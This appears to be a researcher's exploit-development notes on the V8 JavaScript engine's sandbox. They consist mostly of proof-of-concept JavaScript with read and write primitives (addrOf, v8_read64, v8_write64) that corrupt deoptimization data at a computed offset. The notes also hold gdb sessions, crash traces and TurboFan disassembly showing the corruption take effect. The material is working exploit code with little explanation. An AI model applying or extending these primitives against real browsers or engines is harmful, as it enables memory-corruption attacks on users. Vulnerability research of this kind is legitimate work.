

```js
function foo() {
    const v11 = new Int8Array(150);
    Object(v11,...v11,v11);
  }
  
  foo();
  const dummy = new Int8Array(150);
  %DebugPrint(dummy);
  %SystemBreak();
  
  foo();
```
```bash
DebugPrint: 0x3b3e0004a32d: [JSTypedArray]
 - map: 0x3b3e00283985 <Map[76](INT8ELEMENTS)> [FastProperties]
 - prototype: 0x3b3e00283a19 <Object map = 0x3b3e002839ad>
 - elements: 0x3b3e00000ed1 <ByteArray[0]> [INT8ELEMENTS]
 - embedder fields: 2
 - cpp_heap_wrappable: 0
 - buffer: 0x3b3e0004a2e9 <ArrayBuffer map = 0x3b3e00289fd9>
 - byte_offset: 0
 - byte_length: 150
 - length: 150
 - data_ptr: 0x3b3f00000100
   - base_pointer: (nil)
   - external_pointer: 0x3b3f00000100
 - properties: 0x3b3e00000725 <FixedArray[0]>
 - All own properties (excluding elements): {}
 - elements: 0x3b3e00000ed1 <ByteArray[0]> {
       0-149: 0
 }
 - embedder fields = {
    0, aligned pointer: (nil)
    0, aligned pointer: (nil)
 }
0x3b3e00283985: [Map] in OldSpace
 - map: 0x3b3e002816d9 <MetaMap (0x3b3e00281729 <NativeContext[295]>)>
 - type: JS_TYPED_ARRAY_TYPE
 - instance size: 76
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: INT8ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x3b3e00000069 <undefined>
 - prototype_validity cell: 0x3b3e00000a89 <Cell value= 1>
 - instance descriptors (own) #0: 0x3b3e00000759 <DescriptorArray[0]>
 - prototype: 0x3b3e00283a19 <Object map = 0x3b3e002839ad>
 - constructor: 0x3b3e00283951 <JSFunction Int8Array (sfi = 0x3b3e0027b9ed)>
 - dependent code: 0x3b3e00000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0


Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
-----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
  RAX: 0x0000000000000000  RBX: 0x00005555555E3000  RBP: 0x00007FFFFFFFD400  RSP: 0x00007FFFFFFFD400  [e[1m][e[0;31m]o d I t s z a p c
  RDI: 0x0000000000000000  RSI: 0x00005555555E3000  RDX: 0x00005555555E3000  RCX: 0x00003B3E00000000  RIP:[e[0;31m] 0x00007FFFF3FF3035
  R8 : 0x00007FFFFFFFD530  R9 : 0x0000000000000053  R10: 0x00007FFFF3FB0A30  R11: 0x00007FFFF3FF3030  R12: 0x0000000000000005
  R13: 0x00005555555E3080  R14: 0x000055555565E6E8  R15: 0x000055555565E6E8
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
=> 0x7ffff3ff3035 <_ZN2v84base2OS10DebugBreakEv+5>:	pop    rbp
   0x7ffff3ff3036 <_ZN2v84base2OS10DebugBreakEv+6>:	ret
   0x7ffff3ff3037:	int3
   0x7ffff3ff3038:	int3
   0x7ffff3ff3039:	int3
   0x7ffff3ff303a:	int3
   0x7ffff3ff303b:	int3
   0x7ffff3ff303c:	int3
-----------------------------------------------------------------------------------------------------------------------------
v8::base::OS::DebugBreak () at ../../src/base/platform/platform-posix.cc:737
warning: 737	../../src/base/platform/platform-posix.cc: No such file or directory
gdb$ x/20gx 0x3b3e00000ed1+0x298d0b
0x3b3e00299bdc:	0x00299b1d00209601	0x00299ba100299bb9
0x3b3e00299bec:	0x00000a9100000741	0x0000aaa000299a41
gdb$ set *0x3b3e00299bdc=0xffffffff
gdb$ c
Continuing.

Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
-----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
  RAX: 0x0000000000000001  RBX: 0x0000000000000000  RBP: 0x00007FFFFFFFD530  RSP: 0x00007FFFFFFFD4D8  [e[1m][e[0;31m]o d I t s z A P c
  RDI: 0x00003B3E00299BD1  RSI: 0x00003B3E00299BB9  RDX: 0x00003B3E00000069  RCX: 0x0000000007FFFFF0  RIP:[e[0;31m] 0x00007FFF7F482F60
  R8 : 0x00003B3E00000069  R9 : 0x000000000000005C  R10: 0x00007FFF92FF0000  R11: 0x00003B3E00299BD1  R12: 0x00003B3E00299BB9
  R13: 0x00005555555E3080  R14: 0x00003B3E00000000  R15: 0x000055555561A980
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
=> 0x7fff7f482f60:	mov    rcx,QWORD PTR [r10+rcx*1]
   0x7fff7f482f64:	jmp    rcx
```


To get the offset `console.log(v8_read64(addrOf(dummy)+0x24e5a2).toString(16));` breakpoint at `./../src/common/ptr-compr.h:174` 
`=> 0x7ffff599d5fa <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+58>:	movzx  r12d,WORD PTR [r14])`
and calculate by 
```js
gdb$ p/x $r14-0x159b0004b241 (DebugPrint: 0x159b0004b241: [JSTypedArray])
$1 = 0x24e5a1
```
Plus 1 for correct offset.

```js
// Copyright 2017 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --allow-natives-syntax
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }


Object.prototype.__defineGetter__(0, () => {
  throw Error();
});
var a = [, 0.1];
function foo(i) {
  a[i];
};
for (var i = 0; i < 0x10000; ++i) {
  foo(1);
}

const dummy = new Int8Array(150);
%DebugPrint(dummy);
console.log(v8_read64(addrOf(dummy)+0x24e5a2).toString(16));
v8_write64(addrOf(dummy)+0x24e5a2,0x11001002000c0f02n);
console.log(v8_read64(addrOf(dummy)+0x24e5a2).toString(16));
%SystemBreak();
foo(0);

DebugPrint: 0x35700004b241: [JSTypedArray]
 - map: 0x357000283941 <Map[76](INT8ELEMENTS)> [FastProperties]
 - prototype: 0x3570002839d5 <Object map = 0x357000283969>
 - elements: 0x357000000ec1 <ByteArray[0]> [INT8ELEMENTS]
 - embedder fields: 2
 - cpp_heap_wrappable: 0
 - buffer: 0x35700004b1fd <ArrayBuffer map = 0x357000289c25>
 - byte_offset: 0
 - byte_length: 150
 - length: 150
 - data_ptr: 0x357100000000
   - base_pointer: (nil)
   - external_pointer: 0x357100000000
 - properties: 0x357000000725 <FixedArray[0]>
 - All own properties (excluding elements): {}
 - elements: 0x357000000ec1 <ByteArray[0]> {
       0-149: 0
 }
 - embedder fields = {
    0, aligned pointer: (nil)
    0, aligned pointer: (nil)
 }
0x357000283941: [Map] in OldSpace
 - map: 0x3570002816d9 <MetaMap (0x357000281729 <NativeContext[291]>)>
 - type: JS_TYPED_ARRAY_TYPE
 - instance size: 76
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: INT8ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x357000000069 <undefined>
 - prototype_validity cell: 0x357000000a89 <Cell value= 1>
 - instance descriptors (own) #0: 0x357000000759 <DescriptorArray[0]>
 - prototype: 0x3570002839d5 <Object map = 0x357000283969>
 - constructor: 0x35700028390d <JSFunction Int8Array (sfi = 0x35700027a469)>
 - dependent code: 0x357000000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

11001002000c0002
11001002000c0f02

Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
-----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
  RAX: 0x0000000000000000  RBX: 0x00005555555E2000  RBP: 0x00007FFFFFFFD3E0  RSP: 0x00007FFFFFFFD3E0  [e[1m][e[0;31m]o d I t s z a P c
  RDI: 0x0000000000000000  RSI: 0x00005555555E2000  RDX: 0x00005555555E2000  RCX: 0x0000357000000000  RIP:[e[0;31m] 0x00007FFFF3FF2F65
  R8 : 0x00007FFFFFFFD530  R9 : 0x0000000000000153  R10: 0x00007FFFF3FB0A30  R11: 0x00007FFFF3FF2F60  R12: 0x0000000000000005
  R13: 0x00005555555E2080  R14: 0x000055555565D2F0  R15: 0x000055555565D2F0
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
=> 0x7ffff3ff2f65 <_ZN2v84base2OS10DebugBreakEv+5>:	pop    rbp
   0x7ffff3ff2f66 <_ZN2v84base2OS10DebugBreakEv+6>:	ret
   0x7ffff3ff2f67:	int3
   0x7ffff3ff2f68:	int3
   0x7ffff3ff2f69:	int3
   0x7ffff3ff2f6a:	int3
   0x7ffff3ff2f6b:	int3
   0x7ffff3ff2f6c:	int3
-----------------------------------------------------------------------------------------------------------------------------
v8::base::OS::DebugBreak () at ../../src/base/platform/platform-posix.cc:735
warning: 735	../../src/base/platform/platform-posix.cc: No such file or directory
gdb$ c
Continuing.


#
# Safely terminating process due to error in ../../src/objects/deoptimization-data.cc, line 249
# The following harmless error was encountered: Check failed: index_ < buffer_.length() (80 vs. 80).
#
#
#
#FailureMessage Object: 0x7fffffffce00
==== C stack trace ===============================

    /util/v8_sandbox/v8/out/test/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7ffff3ff53d3]
    /util/v8_sandbox/v8/out/test/libv8_libplatform.so(+0x1631d) [0x7ffff7faf31d]
    /util/v8_sandbox/v8/out/test/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x17d) [0x7ffff3fd67fd]
    /util/v8_sandbox/v8/out/test/libv8.so(+0x1ef60e8) [0x7ffff5ef60e8]
    /util/v8_sandbox/v8/out/test/libv8.so(+0x19ae78f) [0x7ffff59ae78f]
    /util/v8_sandbox/v8/out/test/libv8.so(+0x19b0c1a) [0x7ffff59b0c1a]
    /util/v8_sandbox/v8/out/test/libv8.so(+0x199bbdb) [0x7ffff599bbdb]
    [0x7fff7f3801ff]
Couldn't get registers: No such process.
```

## Confirmed?

Disable the debug check 
https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/deoptimization-data.cc;l=274
and run again 
https://source.chromium.org/chromium/chromium/src/+/main:v8/src/deoptimizer/translated-state.cc;l=1798
```js
Continuing.
# Ignoring debug check failure in ../../src/base/vector.h, line 77: index < length_ (80 vs. 80)


#
# Safely terminating process due to error in ../../src/deoptimizer/translated-state.cc, line 1649
# The following harmless error was encountered: We should never get here - unexpected deopt info.
#
#
#
#FailureMessage Object: 0x7fffffffce30
==== C stack trace ===============================

    /util/v8_sandbox/v8/out/test/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7ffff3ff53d3]
    /util/v8_sandbox/v8/out/test/libv8_libplatform.so(+0x1631d) [0x7ffff7faf31d]
    /util/v8_sandbox/v8/out/test/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x17d) [0x7ffff3fd67fd]
    /util/v8_sandbox/v8/out/test/libv8.so(+0x19b0535) [0x7ffff59b0535]
    /util/v8_sandbox/v8/out/test/libv8.so(+0x19b0c1a) [0x7ffff59b0c1a]
    /util/v8_sandbox/v8/out/test/libv8.so(+0x199bbdb) [0x7ffff599bbdb]
    [0x7fff7f3801ff]
```
```js

Object.prototype.__defineGetter__(0, () => {
  throw Error();
});
var a = [, 0.1];
function foo(i) {
  a[i];
};
for (var i = 0; i < 0x10000; ++i) {
  foo(1);
}

const dummy = new Int8Array(150);
%DebugPrint(dummy);
%SystemBreak();
foo(0);

```

```js
Sandbox testing mode is enabled. Write to the page starting at 0x374211ccc000 (available from JavaScript as `Sandbox.targetPage`) to demonstrate a sandbox bypass.
Concurrent recompilation has been disabled for tracing.
---------------------------------------------------
Begin compiling method foo using TurboFan
--- Raw source ---
(i) {
  a[i];
};

--- Optimized code ---
optimization_id = 1
source_position = 297
kind = TURBOFAN
name = foo
stack_slots = 8
compiler = turbofan
address = 0x13170004045d

Instructions (size = 532)
0x7fff60000540     0  488d1df9ffffff       REX.W leaq rbx,[rip+0xfffffff9]
0x7fff60000547     7  483bd9               REX.W cmpq rbx,rcx
0x7fff6000054a     a  740d                 jz 0x7fff60000559  <+0x19>
0x7fff6000054c     c  ba86000000           movl rdx,0x86
0x7fff60000551    11  41ff9598540000       call [r13+0x5498]
0x7fff60000558    18  cc                   int3l
0x7fff60000559    19  8b59f4               movl rbx,[rcx-0xc]
0x7fff6000055c    1c  490b9de8010000       REX.W orq rbx,[r13+0x1e8]
0x7fff60000563    23  f6431a20             testb [rbx+0x1a],0x20
0x7fff60000567    27  0f85d31e3d1f         jnz 0x7fff7f3d2440  (CompileLazyDeoptimizedCode)    ;; near builtin entry
0x7fff6000056d    2d  55                   push rbp
0x7fff6000056e    2e  4889e5               REX.W movq rbp,rsp
0x7fff60000571    31  56                   push rsi
0x7fff60000572    32  57                   push rdi
0x7fff60000573    33  50                   push rax
0x7fff60000574    34  4883ec18             REX.W subq rsp,0x18
0x7fff60000578    38  488975e0             REX.W movq [rbp-0x20],rsi
0x7fff6000057c    3c  493b65a0             REX.W cmpq rsp,[r13-0x60] (external value (StackGuard::address_of_jslimit()))
0x7fff60000580    40  0f8675000000         jna 0x7fff600005fb  <+0xbb>
0x7fff60000586    46  48baa1960400280f0000 REX.W movq rdx,0xf28000496a1    ;; object: 0x0f28000496a1 <JSArray[2]>
0x7fff60000590    50  b9c9cb2800           movl rcx,0x28cbc9    ;; (compressed) object: 0x0f280028cbc9 <Map[16](HOLEY_DOUBLE_ELEMENTS)>
0x7fff60000595    55  394aff               cmpl [rdx-0x1],rcx
0x7fff60000598    58  0f858f010000         jnz 0x7fff6000072d  <+0x1ed>
0x7fff6000059e    5e  8b4a07               movl rcx,[rdx+0x7]
0x7fff600005a1    61  4903ce               REX.W addq rcx,r14
0x7fff600005a4    64  8b520b               movl rdx,[rdx+0xb]
0x7fff600005a7    67  488b7d18             REX.W movq rdi,[rbp+0x18]
0x7fff600005ab    6b  40f6c701             testb rdi,0x1
0x7fff600005af    6f  0f856f000000         jnz 0x7fff60000624  <+0xe4>
0x7fff600005b5    75  4c8bc7               REX.W movq r8,rdi
0x7fff600005b8    78  41d1f8               sarl r8, 1
0x7fff600005bb    7b  4d63c0               REX.W movsxlq r8,r8
0x7fff600005be    7e  d1fa                 sarl rdx, 1
0x7fff600005c0    80  4863d2               REX.W movsxlq rdx,rdx
0x7fff600005c3    83  4c3bc2               REX.W cmpq r8,rdx
0x7fff600005c6    86  0f8365010000         jnc 0x7fff60000731  <+0x1f1>
0x7fff600005cc    8c  c4a17b1044c107       vmovsd xmm0,[rcx+r8*8+0x7]
0x7fff600005d3    93  c5f92ec0             vucomisd xmm0,xmm0
0x7fff600005d7    97  0f8a34010000         jpe 0x7fff60000711  <+0x1d1>
0x7fff600005dd    9d  498d4669             REX.W leaq rax,[r14+0x69]
0x7fff600005e1    a1  488b4de8             REX.W movq rcx,[rbp-0x18]
0x7fff600005e5    a5  488be5               REX.W movq rsp,rbp
0x7fff600005e8    a8  5d                   pop rbp
0x7fff600005e9    a9  4883f902             REX.W cmpq rcx,0x2
0x7fff600005ed    ad  7f03                 jg 0x7fff600005f2  <+0xb2>
0x7fff600005ef    af  c21000               ret 0x10
0x7fff600005f2    b2  415a                 pop r10
0x7fff600005f4    b4  488d24cc             REX.W leaq rsp,[rsp+rcx*8]
0x7fff600005f8    b8  4152                 push r10
0x7fff600005fa    ba  c3                   retl
0x7fff600005fb    bb  ba20000000           movl rdx,0x20
0x7fff60000600    c0  52                   push rdx
0x7fff60000601    c1  48bb20ed4bf6ff7f0000 REX.W movq rbx,0x7ffff64bed20    ;; external reference (Runtime::StackGuardWithGap)
0x7fff6000060b    cb  b801000000           movl rax,0x1
0x7fff60000610    d0  48be29172800280f0000 REX.W movq rsi,0xf2800281729    ;; object: 0x0f2800281729 <NativeContext[291]>
0x7fff6000061a    da  e8e1007a1f           call 0x7fff7f7a0700  (CEntry_Return1_ArgvOnStack_NoBuiltinExit)    ;; near builtin entry
0x7fff6000061f    df  e962ffffff           jmp 0x7fff60000586  <+0x46>
0x7fff60000624    e4  448b47ff             movl r8,[rdi-0x1]
0x7fff60000628    e8  41baffffffff         movl r10,0xffffffff
0x7fff6000062e    ee  4d3bc2               REX.W cmpq r8,r10
0x7fff60000631    f1  760d                 jna 0x7fff60000640  <+0x100>
0x7fff60000633    f3  ba02000000           movl rdx,0x2
0x7fff60000638    f8  41ff9598540000       call [r13+0x5498]
0x7fff6000063f    ff  cc                   int3l
0x7fff60000640   100  48894dd8             REX.W movq [rbp-0x28],rcx
0x7fff60000644   104  488955d0             REX.W movq [rbp-0x30],rdx
0x7fff60000648   108  4181f809080000       cmpl r8,0x809
0x7fff6000064f   10f  0f8472000000         jz 0x7fff600006c7  <+0x187>
0x7fff60000655   115  4181f87d040000       cmpl r8,0x47d
0x7fff6000065c   11c  0f87d3000000         ja 0x7fff60000735  <+0x1f5>
0x7fff60000662   122  4989e2               REX.W movq r10,rsp
0x7fff60000665   125  4883ec08             REX.W subq rsp,0x8
0x7fff60000669   129  4883e4f0             REX.W andq rsp,0xf0
0x7fff6000066d   12d  4c891424             REX.W movq [rsp],r10
0x7fff60000671   131  48b8d0f12ff6ff7f0000 REX.W movq rax,0x7ffff62ff1d0    ;; external reference (String::ToArrayIndex)
0x7fff6000067b   13b  40f6c40f             testb rsp,0xf
0x7fff6000067f   13f  7401                 jz 0x7fff60000682  <+0x142>
0x7fff60000681   141  cc                   int3l
0x7fff60000682   142  4c8d1515000000       REX.W leaq r10,[rip+0x15]
0x7fff60000689   149  4d895578             REX.W movq [r13+0x78] (external value (IsolateData::fast_c_call_caller_pc_address)),r10
0x7fff6000068d   14d  49896d70             REX.W movq [r13+0x70] (external value (IsolateData::fast_c_call_caller_fp_address)),rbp
0x7fff60000691   151  49c785a800000000000000 REX.W movq [r13+0xa8] (external value (Isolate::context_address())),0x0
0x7fff6000069c   15c  ffd0                 call rax
0x7fff6000069e   15e  49c7457000000000     REX.W movq [r13+0x70] (external value (IsolateData::fast_c_call_caller_fp_address)),0x0
0x7fff600006a6   166  488b2424             REX.W movq rsp,[rsp]
0x7fff600006aa   16a  4c63c0               REX.W movsxlq r8,rax
0x7fff600006ad   16d  83f8ff               cmpl rax,0xff
0x7fff600006b0   170  0f8483000000         jz 0x7fff60000739  <+0x1f9>
0x7fff600006b6   176  488b55d0             REX.W movq rdx,[rbp-0x30]
0x7fff600006ba   17a  488b7d18             REX.W movq rdi,[rbp+0x18]
0x7fff600006be   17e  488b4dd8             REX.W movq rcx,[rbp-0x28]
0x7fff600006c2   182  e9f7feffff           jmp 0x7fff600005be  <+0x7e>
0x7fff600006c7   187  c5fb104703           vmovsd xmm0,[rdi+0x3]
0x7fff600006cc   18c  c461fb2cc0           vcvttsd2siq r8,xmm0
0x7fff600006d1   191  c4c1832ac8           vcvtqsi2sd xmm1,xmm15,r8
0x7fff600006d6   196  c5f92ec1             vucomisd xmm0,xmm1
0x7fff600006da   19a  0f8a5d000000         jpe 0x7fff6000073d  <+0x1fd>
0x7fff600006e0   1a0  0f8557000000         jnz 0x7fff6000073d  <+0x1fd>
0x7fff600006e6   1a6  49b9ffffffffffff1f00 REX.W movq r9,0x1fffffffffffff
0x7fff600006f0   1b0  4d3bc1               REX.W cmpq r8,r9
0x7fff600006f3   1b3  0f8d48000000         jge 0x7fff60000741  <+0x201>
0x7fff600006f9   1b9  49b9010000000000e0ff REX.W movq r9,0xffe0000000000001
0x7fff60000703   1c3  4d3bc8               REX.W cmpq r9,r8
0x7fff60000706   1c6  0f8d39000000         jge 0x7fff60000745  <+0x205>
0x7fff6000070c   1cc  e9adfeffff           jmp 0x7fff600005be  <+0x7e>
0x7fff60000711   1d1  c4e37916c201         vpextrd rdx,xmm0,0x1
0x7fff60000717   1d7  81fafffff7ff         cmpl rdx,0xfff7ffff
0x7fff6000071d   1dd  0f8426000000         jz 0x7fff60000749  <+0x209>
0x7fff60000723   1e3  498d4669             REX.W leaq rax,[r14+0x69]
0x7fff60000727   1e7  e9b5feffff           jmp 0x7fff600005e1  <+0xa1>
0x7fff6000072c   1ec  90                   nop
0x7fff6000072d   1ed  41ff55d0             call [r13-0x30]    ;; debug: deopt position, script offset '132'
                                                             ;; debug: deopt position, inlining id 'ffffffff'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 0
                                                             ;; debug: deopt node id 1e
0x7fff60000731   1f1  41ff55d0             call [r13-0x30]    ;; debug: deopt position, script offset '132'
                                                             ;; debug: deopt position, inlining id 'ffffffff'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 1
                                                             ;; debug: deopt node id 53
0x7fff60000735   1f5  41ff55d0             call [r13-0x30]    ;; debug: deopt position, script offset '132'
                                                             ;; debug: deopt position, inlining id 'ffffffff'
                                                             ;; debug: deopt reason 'not a String'
                                                             ;; debug: deopt index 2
                                                             ;; debug: deopt node id 41
0x7fff60000739   1f9  41ff55d0             call [r13-0x30]    ;; debug: deopt position, script offset '132'
                                                             ;; debug: deopt position, inlining id 'ffffffff'
                                                             ;; debug: deopt reason 'not an array index'
                                                             ;; debug: deopt index 3
                                                             ;; debug: deopt node id 4b
0x7fff6000073d   1fd  41ff55d0             call [r13-0x30]    ;; debug: deopt position, script offset '132'
                                                             ;; debug: deopt position, inlining id 'ffffffff'
                                                             ;; debug: deopt reason 'lost precision or NaN'
                                                             ;; debug: deopt index 4
                                                             ;; debug: deopt node id 34
0x7fff60000741   201  41ff55d0             call [r13-0x30]    ;; debug: deopt position, script offset '132'
                                                             ;; debug: deopt position, inlining id 'ffffffff'
                                                             ;; debug: deopt reason 'not an array index'
                                                             ;; debug: deopt index 5
                                                             ;; debug: deopt node id 37
0x7fff60000745   205  41ff55d0             call [r13-0x30]    ;; debug: deopt position, script offset '132'
                                                             ;; debug: deopt position, inlining id 'ffffffff'
                                                             ;; debug: deopt reason 'not an array index'
                                                             ;; debug: deopt index 6
                                                             ;; debug: deopt node id 3b
0x7fff60000749   209  41ff55d0             call [r13-0x30]    ;; debug: deopt position, script offset '132'
                                                             ;; debug: deopt position, inlining id 'ffffffff'
                                                             ;; debug: deopt reason 'hole'
                                                             ;; debug: deopt index 7
                                                             ;; debug: deopt node id 5c
0x7fff6000074d   20d  41ff55d8             call [r13-0x28]    ;; debug: deopt position, script offset '129'
                                                             ;; debug: deopt position, inlining id 'ffffffff'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 8
                                                             ;; debug: deopt node id 11
0x7fff60000751   211  0f1f00               nop

Source positions:
 pc offset  position
         0       297
        46       306
        9d       311
        bb       297
        e4       306
       1e3       311

Inlined functions (count = 0)

Deoptimization Input Data (deopt points = 9)
 index  bytecode-offset  node-id    pc
     0                0       30    NA
     1                0       83    NA
     2                0       65    NA
     3                0       75    NA
     4                0       52    NA
     5                0       55    NA
     6                0       59    NA
     7                0       92    NA
     8               -1       17    df

Safepoints (entries = 2, byte size = 20)
0x7fff6000061f     df  slots (sp->fp): 00100000  deopt      8 trampoline:    20d
0x7fff6000069e    15e  slots (sp->fp): 01100000

RelocInfo (size = 261)
0x7fff60000569  near builtin entry
0x7fff60000588  full embedded object  (0x0f28000496a1 <JSArray[2]>)
0x7fff60000591  compressed embedded object  (0x0f280028cbc9 <Map[16](HOLEY_DOUBLE_ELEMENTS)> compressed)
0x7fff60000603  external reference (Runtime::StackGuardWithGap)  (0x7ffff64bed20)
0x7fff60000612  full embedded object  (0x0f2800281729 <NativeContext[291]>)
0x7fff6000061b  near builtin entry
0x7fff60000673  external reference (String::ToArrayIndex)  (0x7ffff62ff1d0)
0x7fff6000072d  deopt script offset  (306)
0x7fff6000072d  deopt inlining id  (-1)
0x7fff6000072d  deopt reason  (wrong map)
0x7fff6000072d  deopt index
0x7fff6000072d  deopt node id
0x7fff60000731  deopt script offset  (306)
0x7fff60000731  deopt inlining id  (-1)
0x7fff60000731  deopt reason  (out of bounds)
0x7fff60000731  deopt index
0x7fff60000731  deopt node id
0x7fff60000735  deopt script offset  (306)
0x7fff60000735  deopt inlining id  (-1)
0x7fff60000735  deopt reason  (not a String)
0x7fff60000735  deopt index
0x7fff60000735  deopt node id
0x7fff60000739  deopt script offset  (306)
0x7fff60000739  deopt inlining id  (-1)
0x7fff60000739  deopt reason  (not an array index)
0x7fff60000739  deopt index
0x7fff60000739  deopt node id
0x7fff6000073d  deopt script offset  (306)
0x7fff6000073d  deopt inlining id  (-1)
0x7fff6000073d  deopt reason  (lost precision or NaN)
0x7fff6000073d  deopt index
0x7fff6000073d  deopt node id
0x7fff60000741  deopt script offset  (306)
0x7fff60000741  deopt inlining id  (-1)
0x7fff60000741  deopt reason  (not an array index)
0x7fff60000741  deopt index
0x7fff60000741  deopt node id
0x7fff60000745  deopt script offset  (306)
0x7fff60000745  deopt inlining id  (-1)
0x7fff60000745  deopt reason  (not an array index)
0x7fff60000745  deopt index
0x7fff60000745  deopt node id
0x7fff60000749  deopt script offset  (306)
0x7fff60000749  deopt inlining id  (-1)
0x7fff60000749  deopt reason  (hole)
0x7fff60000749  deopt index
0x7fff60000749  deopt node id
0x7fff6000074d  deopt script offset  (297)
0x7fff6000074d  deopt inlining id  (-1)
0x7fff6000074d  deopt reason  ((unknown))
0x7fff6000074d  deopt index
0x7fff6000074d  deopt node id

--- End code ---
---------------------------------------------------
Finished compiling method foo using TurboFan
DebugPrint: 0xf280004af7d: [JSTypedArray]
 - map: 0x0f2800283941 <Map[76](INT8ELEMENTS)> [FastProperties]
 - prototype: 0x0f28002839d5 <Object map = 0xf2800283969>
 - elements: 0x0f2800000ec1 <ByteArray[0]> [INT8ELEMENTS]
 - embedder fields: 2
 - cpp_heap_wrappable: 0
 - buffer: 0x0f280004af39 <ArrayBuffer map = 0xf2800289c25>
 - byte_offset: 0
 - byte_length: 150
 - length: 150
 - data_ptr: 0xf2900000000
   - base_pointer: (nil)
   - external_pointer: 0xf2900000000
 - properties: 0x0f2800000725 <FixedArray[0]>
 - All own properties (excluding elements): {}
 - elements: 0x0f2800000ec1 <ByteArray[0]> {
       0-149: 0
 }
 - embedder fields = {
    0, aligned pointer: (nil)
    0, aligned pointer: (nil)
 }
0xf2800283941: [Map] in OldSpace
 - map: 0x0f28002816d9 <MetaMap (0x0f2800281729 <NativeContext[291]>)>
 - type: JS_TYPED_ARRAY_TYPE
 - instance size: 76
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: INT8ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x0f2800000069 <undefined>
 - prototype_validity cell: 0x0f2800000a89 <Cell value= 1>
 - instance descriptors (own) #0: 0x0f2800000759 <DescriptorArray[0]>
 - prototype: 0x0f28002839d5 <Object map = 0xf2800283969>
 - constructor: 0x0f280028390d <JSFunction Int8Array (sfi = 0xf280027a469)>
 - dependent code: 0x0f2800000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0


Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
-----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
  RAX: 0x0000000000000000  RBX: 0x00005555555E2000  RBP: 0x00007FFFFFFFD3F0  RSP: 0x00007FFFFFFFD3F0  [e[1m][e[0;31m]o d I t s z a p c
  RDI: 0x0000000000000000  RSI: 0x00005555555E2000  RDX: 0x00005555555E2000  RCX: 0x00000F2800000000  RIP:[e[0;31m] 0x00007FFFF3FF2F65
  R8 : 0x00007FFFFFFFD530  R9 : 0x0000000000000098  R10: 0x00007FFFF3FB0A30  R11: 0x00007FFFF3FF2F60  R12: 0x0000000000000005
  R13: 0x00005555555E2080  R14: 0x000055555565D2C0  R15: 0x000055555565D2C0
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
=> 0x7ffff3ff2f65 <_ZN2v84base2OS10DebugBreakEv+5>:	pop    rbp
   0x7ffff3ff2f66 <_ZN2v84base2OS10DebugBreakEv+6>:	ret
   0x7ffff3ff2f67:	int3
   0x7ffff3ff2f68:	int3
   0x7ffff3ff2f69:	int3
   0x7ffff3ff2f6a:	int3
   0x7ffff3ff2f6b:	int3
   0x7ffff3ff2f6c:	int3
-----------------------------------------------------------------------------------------------------------------------------
v8::base::OS::DebugBreak () at ../../src/base/platform/platform-posix.cc:735
735	}
gdb$ b *0x00007ffff599d5fa
Breakpoint 23 at 0x7ffff599d5fa: file ../../src/common/ptr-compr.h, line 174.
gdb$ c
Continuing.
-----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
  RAX: 0x00007FFFF7F0E2F8  RBX: 0x0000555555659F50  RBP: 0x00007FFFFFFFD290  RSP: 0x00007FFFFFFFD270  [e[1m][e[0;31m]o d I t s Z a P c
  RDI: 0x0000555555659F50  RSI: 0x000055555565D2C0  RDX: 0x0000000000000330  RCX: 0x0000000000000300  RIP:[e[0;31m] 0x00007FFFF599D5FA
  R8 : 0x0000000000051E90  R9 : 0x0000000000000030  R10: 0x00007FFF7F3800F2  R11: 0x0000000000000087  R12: 0x0000555555659F50
  R13: 0x0000000000000030  R14: 0x00000F2800299622  R15: 0x00000F2800000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
=> 0x7ffff599d5fa <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+58>:	movzx  r12d,WORD PTR [r14]
   0x7ffff599d5fe <_ZNK2v88internal11Deoptimizer21ComputeInputFrameSizeEv+62>:	mov    r15d,DWORD PTR [rbx+0x30]
